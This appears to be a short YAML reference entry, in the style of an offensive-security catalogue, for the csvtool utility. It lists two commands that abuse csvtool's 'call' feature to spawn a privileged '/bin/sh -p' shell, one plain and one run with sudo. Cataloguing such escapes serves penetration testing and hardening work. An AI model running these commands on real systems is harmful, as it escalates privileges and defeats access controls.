---
functions:
  shell:
    - code: csvtool call '/bin/sh -p;false' /etc/passwd
  sudo:
    - code: sudo csvtool call '/bin/sh -p;false' /etc/passwd
---
